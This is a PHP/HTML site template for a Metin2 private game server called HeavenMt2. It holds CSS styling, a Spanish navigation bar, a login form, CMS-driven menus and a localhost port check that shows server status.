<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <?=build_header_seo(); ?>
    <title><?=build_header_title(); ?></title>
    
    <!-- Favicon -->
    <link rel="shortcut icon" href="favicon.gif" />
    <link rel="icon" type="image/gif" href="favicon.gif" />
    
 
</head>
<script type="text/javascript" src="js/jquery-1.3.2.min.js"></script>
<script src="js/core_global.js" language="javascript" type="text/javascript"></script>
<style type="text/css">
<!--
/*
MUCore Css Start
*/
.where_nav a{
color: #ffffff;
text-decoration: underline;
}

.where_nav a:hover{
color: #ffffff;
text-decoration: none;
}

.iN_title{
font-size:17px;
font-weight:bold;
}

.iN_title_mirror{
font-size:17px;
font-weight:bold;
color:#990000;
}

.iN_description{
font:11px/14px Arial, Verdana, sans-serif;
color:#777;
}

.iN_download_title{
font:bold 14px/18px arial; color:#898989;
}

.iN_download_cat{
font-size:17px;
font-weight:bold;
color:#990000;
}

.iN_title a{
font-size:17px;
font-weight:bold;
text-decoration: none;
}

.iN_title a:hover{
font-size:17px;
font-weight:bold;
text-decoration: none;
color:#990000;
}

.iN_date{
font-family:Verdana, Arial, Helvetica, sans-serif;
font-size:10px;
color:#666666;
}

.iN_news_table tr:hover{
background: #ffffff;
}

.iN_news_content{
font-family:Georgia, "Times New Roman", Times, serif;
font-size:13px;
color:#333333;
margin:0px;
padding-top: 6px;
}

.iN_news_content a{
font-family:Georgia, "Times New Roman", Times, serif;
font-size:13px;
margin:0px;
text-decoration: underline;
}

.iN_news_content a:hover{
font-family:Georgia, "Times New Roman", Times, serif;
font-size:13px;
margin:0px;
text-decoration: none;
}

.iN_new_read_more{
color:#ffffff;
font: 10px Arial, Helvetica, sans-serif;
background: #8b0e0e;
padding: 1px;
}

.iN_new_read_more a{
color: #ffffff;
font-size: 10px;
}

.iRg_text{
font: bold 13px Arial, sans-serif; color: #555555;
}

.iRg_inf{
font: 11px fantasy; #555555;
}

.iRg_line{
background:url(template/<?=$core['config']['template']; ?>/images/inner_line.jpg); background-position:bottom; background-repeat:repeat-x;
font: 11px fantasy; color: #555555;
padding-bottom: 4px
}

.iRg_line_top{
background:url(template/<?=$core['config']['template']; ?>/images/inner_line.jpg); background-position:top; background-repeat:repeat-x;
font: 11px fantasy; color: #555555;
}

.iR_func_status{
border: 1px solid #cccccc;
background: #ffffff;
padding-left: 4px;
font-size: 11px;
}

.iR_func_status_lacking{
background: #CC3300;
padding: 1px;
padding-left: 3px;
padding-right: 3px;
color: #ffffff;
}

.iR_func_status_free{
background: #00FF00;
padding: 1px;
padding-left: 3px;
padding-right: 3px;
color: #000000;
}

.iR_func_status_free a{
font-size: 11px;
color: #000000;
}

.iRg_inf a{
font: 11px fantasy;
text-decoration: underline;
}

.iRg_inf a:hover{
font: 11px fantasy;
text-decoration: none;
}

.iRg_input{
font-size: 10pt;
font-family: verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
background-color: #ffffff;
border: 1px solid #cccccc;
height: 18px;
}

.iRg_terms_agree{
font: 12px Arial, Verdana, sans-serif;
}

.iRg_terms_agree a{
font: 12px Arial, Verdana, sans-serif;
text-decoration: underline;
}

.iR_rank{
background-color: #181C18;
font: bold 11px Georgia, "Times New Roman", Times, serif; color: #ffffff;
}

.iR_stats{
font: 11px Georgia, "Times New Roman", Times, serif; color: #ffffff;
background-color: #5F6D5F;
padding: 1px;
}

.iR_stats_2{
font: 11px Georgia, "Times New Roman", Times, serif; color: #ffffff;
background-color: #CCCCFF;
padding: 1px;
color: #555555;
}

.iR_stats_bg{
background-color: #996600;
}

.iR_stats_level{
border: 1px solid #cccccc;
font: 11px Georgia, "Times New Roman", Times, serif; color: #555555;
background: #ECECFF;
padding: 1px;
}

.iR_stats_reset{
border: 1px solid #cccccc;
font: 11px Georgia, "Times New Roman", Times, serif; color: #555555;
background: #CECEFF;
padding: 1px;
}

.iR_name{
font: bold 13px Arial, sans-serif; color: #FF3300;
}

.iR_class{
font: 12px Impact, fantasy; color: #666666;
}

.iR_status{
font-size: 11px;
}

.iR_task{
font: 11px Georgia, "Times New Roman", Times, serif;
}

.iR_rank_type{

font: bold 16px Arial, sans-serif;
}

.iR_rank_type a{
font: bold 16px Arial, sans-serif;
text-decoration: none;
}

.iR_rank_type a:hover{
font: bold 16px Arial, sans-serif;
text-decoration: none;
color: #990000;
}

.iR_rank_type_sub{
font: 10px fantasy;
}

.iR_rank_type_sub a{
font: 10px fantasy;
text-decoration: none;
}

.iR_rank_type_sub a:hover{
font: 10px fantasy; color:#990000;
text-decoration: none;
}

.msg_success{
background: #c2ffaf;
border: 1px solid #cccccc;
padding: 4px;
padding-left: 33px;
margin-bottom: 6px;
margin-top: 6px;
background-image:url(template/<?=$core['config']['template']; ?>/images/success.gif);
background-repeat:no-repeat;
background-position: 10px;
font-size: 11px;
font-weight: bold;
color: #444444;
}

.msg_error{
background: #F9F2B9;
border: 1px solid #cccccc;
padding: 4px;
padding-left: 33px;
margin-bottom: 6px;
margin-top: 6px;
background-image:url(template/<?=$core['config']['template']; ?>/images/warning.gif);
background-repeat:no-repeat;
background-position: 10px;
font-size: 11px;
font-weight: bold;
color: #444444;
}

.chat_bg{
border: 1px solid #cccccc;
background: #ffffff;
padding: 4px;
font-size: 11px;
}

.chat_even{
background: #D7D7FF;
padding: 2px;
}

.chat_odd{
padding: 2px;
}

.warehouse_block{
border: 0px;
text-align: center;
background: url(template/<?=$core['config']['template']; ?>/images/warehouse_block.gif);
}

.warehouse_item_block {
border: 0px;
padding: 0px;
text-align: center;
background: url(template/<?=$core['config']['template']; ?>/images/warehouse_item_block.gif);
}

.warehouse_bg {
border: 0px;
padding: 0px;
text-align: center;
background: url(template/<?=$core['config']['template']; ?>/images/warehouse_bg.gif);
}

.item_name{
font: 12px Arial, sans-serif;
color: #ffffff;
font-weight: bold;
}

.item_dur{
font: 11px Arial, sans-serif;
color: #ffffff;
}

.item_requirement{
font: 11px Arial, sans-serif;
color: #ffffff;
}

.item_skill{
font: 11px Arial, sans-serif;
color: #ffffff;
}

.item_options{
font: 11px Arial, sans-serif;
color: #ffffff;
}

.iD_dashed{
border-top: #ffffff dashed 1px;
}

.downloads tr:hover{
background: #ffffff;
}

.curent_step{
background: #FFEF73; border: 1px solid #cccccc;
padding: 2px;
font:bold 11px Arial;
color:#555555;
}

.step{
background: #ECECEC;
border: 1px solid #cccccc;
padding: 2px;
font:bold 11px Arial;
color: #D4D4D4;
}

.hidden_password{
border: 1px solid #cccccc;
background: #ECECEC;
padding: 2px;
width: 200px;
color: #ECECEC;
}

.footer_font{
font: normal 11px Tahoma, Calibri, Verdana, Geneva, sans-serif;
color: #0b1270;
}

.footer_font a{
padding-bottom:5px;
font: normal 11px Tahoma, Calibri, Verdana, Geneva, sans-serif;
color: #ff0000;
text-decoration: none;
}

.footer_font a:hover{
font: normal 11px Tahoma, Calibri, Verdana, Geneva, sans-serif;
color: #ff0000;
text-decoration: underline;
}

.table_list{
background: #ffffff;
color: #000000;
border: outset 1px #DEE0E2;
}

.table_list .title{
background: #DFDFFF;
font: bold 11px tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
padding: 2px;
padding-left: 4px;
color: #595959;
border: outset 1px #555555;
}

.table_list .even{
background: #ECECFF;
}


.table_list .content{
font: 11px tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
padding: 2px;
padding-left: 4px;
}

#rss_feed{
margin-left: 0;
padding-left: 0;
list-style: none;
}

#rss_feed li
{
padding-left: 17px;
background-image: url(template/<?=$core['config']['template']; ?>/images/rss_icon.gif);
background-repeat: no-repeat;
background-position: 0;
}

#rss_feed li a{
text-decoration: none;
}

#rss_feed li a:hover{
text-decoration: underline;
}
/*
MUCore CSS End
--------------------------------*/

html, body, * {
	padding:0;
	margin:0;
	border-left: 23;
}

body {
	background:#f0f3f3;
	text-align:center;
	color:#5a5a5a;
	font-family:Verdana, Geneva, sans-serif;
	font-size:12px;
}

	.left {
		float:left;
	}
	
	.right {
		float:right;
	}

	.clear {clear:both}
	
	.clearfix {clear:both; height:1px;}
	
	hr.hr {display:none;}

	a {text-decoration:none;}
	
		a:focus {outline:none;}
		
		a img {border:none;}
		
/*---------------------------------------------------*/
/* Base Elements ------------------------------------*/

#navbar {
	height:91px;
	background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/bg_navbar.jpg") no-repeat top center;
}

#header {
	height:147px;
	background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/bg_header.jpg") no-repeat top center;
}

#footer {
	height:154px;
	background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/bg_footer.jpg") no-repeat top center;
}

#main {
	background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/bg_main_repeat.png") repeat-y top center;
}

	#main-top {
		background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/bg_main_top.jpg") no-repeat top center;
	}

	#main-btm {
		background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/bg_main_bottom.jpg") no-repeat bottom center;
		min-height:635px;
	}
	
		.w960 {
	width:960px;
	margin:0 auto;
	text-align:left;
		}
		
		.w930 {
			width:930px;
			margin:0 auto;
		}
		
		.w600 {
			width:600px;
			margin:0 auto;
		}
			
			.gui {
				background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/heaven_gui.png");
			}

/*---------------------------------------------------*/
/* Header -------------------------------------------*/

#header #logo {
	display:block;
	width:469px;
	height:96px;
	margin:12px 0 0 6px;
	float:left;
}

#userinfo {
	height:110px;
	width:408px;
	background-position:0 -71px;
	float:right;
	margin:14px 0 0 0;
}

	#userinfo h4 {
		color:#41799f;
		font-size:14px;
		height:38px;
		line-height:38px;
		font-weight:normal;
		text-indent:40px;
	}
	
	#userinfo .avatar {
		height:58px;
		width:58px;
		background-position:-410px -71px;
		margin:5px 0 0 10px;
	}
	
		#userinfo .avatar img {
			margin:4px 0 0 4px;
			height:50px;
			width:50px;
		}
	
	#userinfo .text {
		font-size:10px;
		width:240px;
		padding:8px;
		font-family:Arial, Helvetica, sans-serif;
	}
	
	#userinfo .balance {
		width:75px;
		padding:0 0 0 7px;
		font-size:10px;
	}
	
		.balance .row1 {
			padding:4px 0 11px;
			color:#000;
		}
		
		.balance .row2 {
			padding:0 0 11px;
		}
		
		span.icon {
			display:block;
			float:left;
			height:8px;
			width:9px;
			background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/heaven_gui.png");
			margin:2px 4px 0 0;
		}
		
			.orange {
				color:#e3720d;
			}
			
			.red {
				color:#e30d0d;
			}			
			
			.purple {
				color:#480fa7;
			}				
			
			.blue {
				color:#0d63e3;
			}				
			
			.green {
				color:#588e0a;
			}	
			
			.gray {
				color:#4d4d4d;
			}				
			
				.orange span.icon {
					background-position:-408px -129px;
				}
			
				.red span.icon {
					background-position:-417px -129px;
				}		
			
				.purple span.icon {
					background-position:-426px -129px;
				}		
	
				.blue span.icon {
					background-position:-435px -129px;
				}		
	
				.green span.icon {
					background-position:-444px -129px;
				}		
	
				.gray span.icon {
					background-position:-453px -129px;
				}		

/*---------------------------------------------------*/
/* Navbar -------------------------------------------*/

#navbar ul {
	margin:0 auto;
	width:960px;
	list-style:none;
}

	#navbar ul li, #navbar ul li a {
		display:block;
		float:left;
		font-weight:bold;
	}
	
		#navbar ul li a {
			height:56px;
			line-height:56px;
			background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/navbar_border.png") no-repeat top right;
			text-align:center;
			font-size:14px;
			color:#ddf0ff;
			text-shadow:0 0 3px #000;
			padding:0 40px 0 30px;
		}
		
			#navbar ul li a:hover {
				color:#FFF;
		}
			
			#navbar ul li a:active {
				color:#b6dfff;
			}					
			
			#navbar ul li a.current	{
				color:#FFF !important;
				text-shadow:0 0px 2px #000, 0 0 4px #FFF;
				background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/navbar_border_current.png") no-repeat top right;
			}
			
				#navbar ul li a.noborder {
					background:none;
				}
				
/*---------------------------------------------------*/
/* Main Frame ---------------------------------------*/
			
#content, .sidebar {
	float:left;
	margin-top:60px !important;
}
			
.sidebar {
	width:216px;
}

#content {
	width:446px;
}
					
/*---------------------------------------------------*/
/* Content ------------------------------------------*/

.box-title {
	height:57px;
	line-height:57px;
	background-position:-216px 0;
	text-indent:35px;
	color:#64304a;
	font-size:12px;
	text-shadow:0 1px 3px #FFF;
	font-weight:normal;
}

.box-end {
	height:14px;
	background-position:-216px -57px;
	margin-bottom:20px;
}

.box-con {
	background-position:-1767px 0;
	background-repeat:repeat-y;
	line-height:1.5;
	font-size:11px;
	width:438px;
	margin:0 auto;
}

	.box-title h2 {
		font-size:12px;
	}
	
	/*-----------------------------------------------*/
	/* News -----------------------------------------*/
	
	.nlink {
		display:block;
		width:410px;
		height:33px;
		line-height:30px;
		background-position:-662px 0;
		margin:3px auto;
		color:#2f2f2f;
	}
				
		.nlink:hover {
			background-position:-662px -33px;
		}
			
		.nlink:active {
			background-position:-662px -66px;
		}	
		
			.nlink.new:hover {
				color:#000;
			}
		
			.nlink.event:hover {
				color:#a50095;
			}		
		
			.nlink.hot:hover {
				color:#ed6002;
			}
			
			.nlink.update:hover {
				color:#7aa900;
			}			
			
			.nlink.notice:hover {
				color:#1e9191;
			}	
			
		.nlink span {
			display:block;
			float:left;
		}
		
			.nlink .text {
				width:255px;
			}

			.nlink .date {
				width:99px;
				text-align:center;
				font-size:10px;
			}
			
			.nlink .type-icon {
				height:19px;
				width:41px;
				background-position:-662px -99px;
				margin:6px 10px 0 4px;
			}
			
				.new .type-icon {
					background-position:-662px -99px;
				}
			
				.event .type-icon {
					background-position:-703px -99px;
				}			
			
				.hot .type-icon {
					background-position:-744px -99px;
				}
				
				.update .type-icon {
					background-position:-785px -99px;
				}				
				
				.notice .type-icon {
					background-position:-826px -99px;
				}	
				
	/*-----------------------------------------------*/
	/* Slider ---------------------------------------*/
	
	#slider, #slider ul, #slider ul li {
		width:375px;
		height:75px;
		overflow:hidden;
		display:block;
		margin:0 auto;
	}
	
		#slider a.ss {
			display:block;
			float:left;
			height:58px;
			width:71px;
			background-position:-906px -99px;
			margin:8px 10px;
			position:relative;
			left:5px;
		}
		
			#slider a.ss img {
				height:48px;
				width:61px;
				margin:5px 0 0 5px;
			}
			
				#slider a.ss:hover {
					background-position:-977px -99px;
				}
				
				#slider a.ss:active {
					background-position:-1048px -99px;
				}
	
					/* Controls */
					
					#prevBtn, #nextBtn {
						position:absolute;
					}
					
					#prevBtn a, 
					#nextBtn a { 
						display:block;
						width:43px;
						height:42px;
						background:url("template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/heaven_gui.png");
						z-index:24;
						overflow:hidden;
						line-height:150px;
						position:relative;
						bottom:58px;
					}	
				
					#nextBtn a {
						float:right;
						background-position:-691px -118px;
						left:412px;
					}
					
						#nextBtn a:hover {
							background-position:-777px -118px;
						}
						
						#nextBtn a:active {
							background-position:-863px -118px;
						}						
						
					#prevBtn a {
						float:left;
						right:17px;
						background-position:-648px -118px;
					}
					
						#prevBtn a:hover {
							background-position:-734px -118px;
						}					
					
						#prevBtn a:active {
							background-position:-820px -118px;
						}
						
/*---------------------------------------------------*/
/* Sidebars -----------------------------------------*/

#sidebar-left {
	margin:0 17px 0 24px;
}

#sidebar-right {
	margin: 0 24px 0 17px;
}

	.sb-title {
		height:57px;
		line-height:57px;
		background-position:0 0;
		text-align:center;
	}
	
	.sb-end {
		height:14px;
		margin-bottom:20px;
		background-position:0 -57px;
	}
	
	.sb-con {
		background-position:-2205px 0;
		background-repeat:repeat-y;
		width:208px;
		margin:0 auto;
	}
	
		.sidebar h3 {
			color:#304f64;
			text-shadow:0 1px 3px #FFF;
			font-size:13px;
			font-family:Arial, Helvetica, sans-serif;
		}
		
		.sb-sep, .sb-sep2 {
			height:2px;
			width:180px;
			margin:2px auto;
			clear:both;
			background-position:-468px -176px;
		}
		
		.sb-sep2 {
			height:3px;
			background-position:-468px -181px;
		}	
		
	/*-------------------------------- HeavenMt2 ----*/
	/* Login ----------------------------------------*/
	
	form#login {
		width:180px;
		margin:0 auto;
	}
	
		input.bar {
			color:#434343;
			font-size:10px;
			padding:10px 10px;
			width:160px;
			height:15px;
			border:none;
			background-position:-468px -71px;
		}
		
			form#login .bar {
				margin:2px auto;
			}
		
			input.bar:hover {
				color:#a85700;
				background-position:-468px -106px;
			}	
			
			input.bar:active,
			input.bar:focus {
				color:#603200;
				background-position:-468px -141px;
			}				
			
		.btn {
			border:none;
			display:block;
			width:69px;
			height:29px;
			line-height:29px;
			cursor:pointer;
			color:#FFF;
			font-size:12px;
			text-align:center;
			font-weight:bold;
			font-family:Arial, Helvetica, sans-serif;
		}
		
			form#login .btn {
				margin:6px 0 6px 3px;
			}
	
			*>input.btn {
				padding-bottom:5px;
			}
			
				.btn.orange {
					background-position:0 -181px;
					text-shadow:0 1px 5px #6e3c00;
				}
				
				.btn.orange:hover {
					background-position:-69px -181px;
					text-shadow:0 0px 8px #FFF;
				}	
				
				.btn.orange:active {
					background-position:-138px -181px;
					text-shadow:0 0px 8px #6e3c00;
				}					
				
				.btn.purple {
					background-position:-207px -181px;
					text-shadow:0 1px 5px #6d006e;
				}
				
				.btn.purple:hover {
					background-position:-276px -181px;
					text-shadow:0 0px 8px #FFF;
				}	
				
				.btn.purple:active {
					background-position:-345px -181px;
					text-shadow:0 0px 8px #6d006e;
				}	
				
			#login .right {
				width:102px;
				font-size:10px;
				padding:6px 0 0px;
				font-family:Arial, Helvetica, sans-serif;
			}
			
				#login .right a {
					color:#595959;
					padding:1px 0;
					display:inline-block;
				}
				
					#login .right a:hover {
						color:#363636;
					}
					
					#login .right a:active {
						color:#000;
					}
					
				#login .right a span {
					color:#8c9109;
				}
				
	/*-----------------------------------------------*/
	/* Status & Statistics --------------------------*/
	
	.sidebar .stat p, .sidebar .stat2 p {
		padding:5px 5px 5px 20px;
	}
	
		.sidebar .stat p span, .sidebar .stat2 p span {
			padding:0 6px 0 0;
		}
		
			.on, .sidebar .stat2 p.on span {
				color:#597b24;
			}
			
			.off, .sidebar .stat2 p.off span {
				color:#a03434;
			}
			
			.info, .sidebar .stat2 p.info span {
				color:#316183;
			}
			
				.sidebar .stat2 p {
					color:#666;
				}
				
				.sidebar .stat2 p strong {
					font-weight:normal;
					color:#000;
				}

	/*-----------------------------------------------*/
	/* Ranking --------------------------------------*/
	
	#ranking {
		width:180px;
		margin:7px auto;
	}
	
		#ranking .player span {
			display:block;
			float:left;
			padding:5px;
			font-size:10px;
		}
		
		#server-select {
			padding:4px;
			width:100px;
			margin:0 0 4px 1px;
			font-size:11px;
			border:1px solid #CCC;
		}
		
		#server-select2 {
			padding:4px;
			width:178px;
			margin:0 0 4px 1px;
			font-size:11px;
			border:1px solid #CCC;
		}
		
		
			#server-select option {
				border-bottom:1px solid #EEE;
				padding:0 2px;
			}
			
			#server-select2 option {
				border-bottom:1px solid #EEE;
				padding:0 2px;
			}

		.p-rank {
			width:15px;
			text-align:center;
		}
		
		.p-name {
			width:95px;
			text-align:left;
		}
		
		.p-lvl {
			width:32px;
			text-align:right;
		}
		
		.btn2 {
			display:block;
			width:87px;
			height:23px;
			background-position:-414px -186px;
			text-align:center;
			line-height:23px;
			color:#a200ca;
			font-size:10px;
			text-shadow:0 1px 0px #FFF;
		}
		
			#ranking .btn2 {
				margin:7px 0 4px;
			}
			
			.btn2:hover {
				background-position:-501px -186px;
				color:#a200ca;
			}
			
			.btn2:active {
				background-position:-588px -186px;
				color:#4d0060;
			}			

	/*-----------------------------------------------*/
	/* Special Buttons ------------------------------*/
	
	a.special {
		display:block;
		height:62px;
		width:216px;
		margin:0 auto 16px;
		font-size:16px;
		text-shadow:0 1px 3px #FFF;
		line-height:62px;
		text-indent:25px;
		font-family:Arial, Helvetica, sans-serif;
		font-weight:bold;
	}
	
		a.special:hover {
			color:#000;
		}
		
		/* download button */
	
		.sb-download {
			background-position:-1119px 0;
			color:#0b4000;
		}
		
			.sb-download:hover {
				background-position:-1119px -62px;
			}
			
			.sb-download:active {
				background-position:-1119px -124px;
			}
			
		/* support button */
		
		.sb-support {
			background-position:-1335px 0;
			color:#b5002f;
		}
		
			.sb-support:hover {
				background-position:-1335px -62px;
			}
			
			.sb-support:active {
				background-position:-1335px -124px;
			}			
			
		/* donate button */
		
		.sb-donate {
			background-position:-1551px 0;
			color:#b55500;
		}
		
			.sb-donate:hover {
				background-position:-1551px -62px;
			}
			
			.sb-donate:active {
				background-position:-1551px -124px;
			}		

	/*-----------------------------------------------*/
	/* Affiliates -----------------------------------*/
	
	.affiliates a img {
		margin:5px 0;
	}

/*---------------------------------------------------*/
/* Misc ---------------------------------------------*/

.center {
	text-align:center;
}

.cp {
	display:none;
	/*key: 29b43171bd0d8fe8d6d3d4697e1a43fc;*/
}

/*---------------------------------------------------*/
/* Footer -------------------------------------------*/

#footer {
	font-size:10px;
	line-height:135px;
	overflow:hidden;
}

	#footer .left {
		margin-left:25px;
	}
	
	#footer .right {
		margin-right:25px;
	}

		#footer a {
			color:#28648d;
		}		
		
			#footer a:hover {
				text-decoration:underline;
			}
			
			#footer a:active {
				color:#133852;
			}

/*---------------------------------------------------*/
/* W3C Valid CSS 3.0
/* azizgfx@gmail.com
/* www.aziznatour.com
/* 29b43171bd0d8fe8d6d3d4697e1a43fc
/*---------------------------------------------------*/






#lightbox{
	background-color:#000;
	padding: 10px;
	border-bottom: 2px solid #666;
	border-right: 2px solid #666;
	}
#lightboxDetails{
	font-size: 0.8em;
	padding-top: 0.4em;
	}	
#lightboxCaption{ float: left; }
#keyboardMsg{ float: right; }
#closeButton{ top: 5px; right: 5px; }

#lightbox img{ border: none; clear: both;} 
#overlay img{ border: none; }

#overlay{ background-image: url(overlay.html); }

* html #overlay{
	background-color: #333;
	back\ground-color: transparent;
	background-image: url(blank.html);
	filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src="overlay.html", sizingMethod="scale");
	}
	
	
</style> 

<body onLoad="start();">


	<div id="navbar">
		<ul>
			<li><a id="nav_main" onclick="javascript:loadContent('main','maincontent'); return false;" href="index.php">Inicio</a></li>
			<li><a id="nav_register" onclick="javascript:loadContent('register','maincontent'); return false;" href="index.php?page_id=register">Registro</a></li>
			<li><a id="nav_download" onclick="javascript:loadContent('download','maincontent'); return false;" href="index.php?page_id=downloads">Download</a></li>
			<li><a id="nav_itemshop" onclick="javascript:loadContent('itemshop','maincontent'); return false;" href="itemshop.html">TiendaShop</a></li>
			<li><a id="nav_ranking" onclick="javascript:loadContent('ranking','maincontent'); return false;" href="index.php?page_id=rankings">Ranking</a></li>
			<li><a onclick="javascript:loadContent('usercp','maincontent'); return false;" href="index.php?page_id=user_cp">CP Usuario</a></li>
			<li><a class="noborder" href="/foro.php/">Foro</a></li>
		</ul>	
	</div>
	
	<!-- Header -->
	<div id="header">
		<div class="w960">
			<div class="clearfix"></div>
			<!-- Logo -->
			<a id="logo" href="index-2.html" title="HeavenMt2"><img src="template/<?=$core['config']['template'] ?>/images/Dkdexter1/logo/heaven_mt2_logo.jpg" alt="HeavenMt2 logo" /></a>
			<!-- User Info -->
			<div id="userinformation">
						</div>
		</div>
	</div>
	
	<!-- Main Wrapper -->
<div id="main">
  <div id="main-top">
	<div id="main-btm">
<div class="w960">
				
					<!-- Left Sidebar -->
<div class="sidebar" id="sidebar-left">
						
						<!-- Login -->
		  <div id="rates">
												<div class="gui sb-title">
									  <h3>Panel Usuario</h3></div>
						<div class="gui sb-con stat">
	
														<p class='info'><left>
														  <span class="gui sb-sep">
													    <?
		  if($user_login == '1'){
		  	echo '<div class="tmp_left_menu">
		  	<ul>';
		$m_uss_row_ = get_sort('engine/cms_data/mods_uss.cms','¦');
 	 	$count_m_uss = 0;
		foreach ($m_uss_row_ as $tr){
			explode("¦",$tr);
			$count_m_uss++;
			if($tr[6] == '1'){
				if($tr[3] != ACCOUNTSETTINGS_CMS_USER){
					echo '<li class="list_menu"><a  href="'.ROOT_INDEX.'?'.LOAD_GET_PAGE.'='.USER_CMS_PAGE.'&'.USER_GET_PAGE.'='.$tr[3].'">'.str_replace($menu_links_title,$menu_links_translated,$tr[2]).'</a></li>';
				}
				
			}
		}
		echo ' </ul>
		 </div>
		 <table width="100%" border="0" align="center" cellpadding="0" cellspacing="4">
		 <tr>
		  <td align="left" class="yellow"><a  href="'.ROOT_INDEX.'?'.LOAD_GET_PAGE.'='.USER_CMS_PAGE.'&'.USER_GET_PAGE.'='.ACCOUNTSETTINGS_CMS_USER.'">'.link_account_settings.'</a></td>
		  <td align="right" class="yellow"><a  href="'.ROOT_INDEX.'?'.LOAD_GET_PAGE.'=logout">'.link_log_out.'</a></td>
		 </tr>
		 </table>
		 
		 ';
		  }else{
		  	echo '<form method="post" action="'.ROOT_INDEX.'?'.LOAD_GET_PAGE.'='.LOGIN_CMS_PAGE.'" name="uss_login_form">
			 <table width="177" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td style="height: 25px; padding-left: 2px;  " width="130"><input type="text" name="uss_id" maxlength="10" size="10" class="aut_inp" value="Usuario"  OnClick="this.value=\'\'"></td>
    <td rowspan="2">&nbsp;</td>
  </tr>
  <tr>
    <td style="height: 25px; padding-left: 2px;"><input type="password" name="uss_password" class="aut_inp" value="PASSWORD" maxlength="12" size="10" OnClick="this.value=\'\'"><input type="hidden" name="process_login"></td>
  </tr>
    <tr>
      <td style="height: 25px; padding-left: 2px;" colspan="2" align="left" class="yellow">
        <input type="image" src="template/'.$core['config']['template'].'/images/Dkdexter1/ui/loguin.gif" onClick="uss_login_form.submit();">
      <a  href="'.ROOT_INDEX.'?'.LOAD_GET_PAGE.'='.LOSTPASSWORD_CMS_PAGE.' style="color:#d9b78a;"><small>Lost Password?</small></a></td>
    </tr>
     </table>
</form>';
		  }
		  ?></span>                                                        
						  <div style="color:#316183"><div id="time"></div></div><div></div>
						  <br>
			</div>
		  <div class="gui sb-end"></div>								</div>
						<!-- Status -->
						<div id="rates">
												<div class="gui sb-title">
												  <h3>MENU</h3></div>
						<div class="gui sb-con stat">
	
														<p class='info'><left>
														  <span class="gui sb-sep">
														  <?
					  $m_row_ = get_sort('engine/cms_data/pag_d.cms','¦');
					#  echo $test[1][2][3];
					  foreach ($m_row_ as $li){
					 #  explode("¦",$li);
					   switch ($li[7]){
					   	case '0':
					   		if($li[8] == '1'){
					   			if($li[6] != '0'){
					   				echo '<li class="sub-menu"><a  href="'.ROOT_INDEX.'?'.LOAD_GET_PAGE.'='.$li[3].'">'.str_replace($menu_links_title,$menu_links_translated,$li[2]).'</a></li>';
					   			}
					   	
					   		}
					   		break;
					   	case '1':
					   		switch ($li[11]){
					   			case '1': $target = "_blank"; break;
					   			case '0': $target = "_self"; break;
					   		}
					   		echo '<li class="sub-menu"><a  href="'.$li[10].'"  target="'.$target.'">'.str_replace($menu_links_title,$menu_links_translated,$li[2]).'</a></li>  ';
					   	
					   	break;
					   }


					  	
					  }
					  
		  ?></span><div style="color:#316183"><div id="time"></div></div><div></div>
						  <br>
						</div>
						<div class="gui sb-end"></div>								</div>
						<!-- Statistics -->
						<div id="stats">
																		<div class="gui sb-title">
																		  <h3>Estado Del Server</h3></div>
						<div class="gui sb-con stat2">
						
							<p class="on"><span>&bull;</span><strong>Server : <?PHP
if (eregi("status/servidor.php", $_SERVER['SCRIPT_NAME'])) { die ("Access Denied"); }
require 'engine/global_config.php';

$onlineoffline = "127.0.0.1";
if ($check=@fsockopen($onlineoffline,55901,$ERROR_NO,$ERROR_STR,(float)0.5)) 
	{ 
	fclose($check); 
	echo '<img src="template/'.$core['config']['template'].'/images/on.png" alt="Online">'; 
	}
else 
	{ 
	echo '<img src="template/'.$core['config']['template'].'/images/off.png" alt="Offline">'; 
	} 
?></strong></p>
							<div class="gui sb-sep"></div>
							
							<p class="info"><span>&bull;</span><strong>Castle siegue: </strong><?PHP
if (eregi("status/statusgscs.php", $_SERVER['SCRIPT_NAME'])) { die ("Access Denied"); }
require 'engine/global_config.php';

$onlineoffline = "127.0.0.1";
if ($check=@fsockopen($onlineoffline,55919,$ERROR_NO,$ERROR_STR,(float)0.5)) 
	{ 
	fclose($check); 
	echo '<img src="template/'.$core['config']['template'].'/images/on.png" alt="Online">'; 
	}
else 
	{ 
	echo '<img src="template/'.$core['config']['template'].'/images/off.png" alt="Offline">'; 
	} 
?></p>
							<div class="gui sb-sep"></div>
							
							<p class="info"><span>&bull;</span><strong>Server Vip: </strong><?PHP
if (eregi("status/servidorvip.php", $_SERVER['SCRIPT_NAME'])) { die ("Access Denied"); }
require 'engine/global_config.php';

$onlineoffline = "127.0.0.1";
if ($check=@fsockopen($onlineoffline,55930,$ERROR_NO,$ERROR_STR,(float)0.5)) 
	{ 
	fclose($check); 
	echo '<img src="template/'.$core['config']['template'].'/images/on.png" alt="Online">'; 
	}
else 
	{ 
	echo '<img src="template/'.$core['config']['template'].'/images/off.png" alt="Offline">'; 
	} 
?></p>
						  <div class="gui sb-sep"></div>
							
							<p class="info">&nbsp;</p>
<p class="info" align="right" style="margin-right:10px;"></p>				
						</div>
						<div class="gui sb-end"></div>						
					</div>						</div><?
                    if($core['language_switch'] == '1'){
                        foreach ($languages as $language_id =>  $language_data){
                            echo '&nbsp;<img  src="template/'.$core['config']['template'].'/images/flags/'.$language_data[2].'">  <a  href="'.ROOT_INDEX.'?change_language='.$language_id.'">'.$language_data[0].'</a>';
                        }
                    }
                    ?>
					<!-- Content -->
		<div id="content">
		  <div id="maincontent">
                    
            <div id="loading" style="display:none; ">
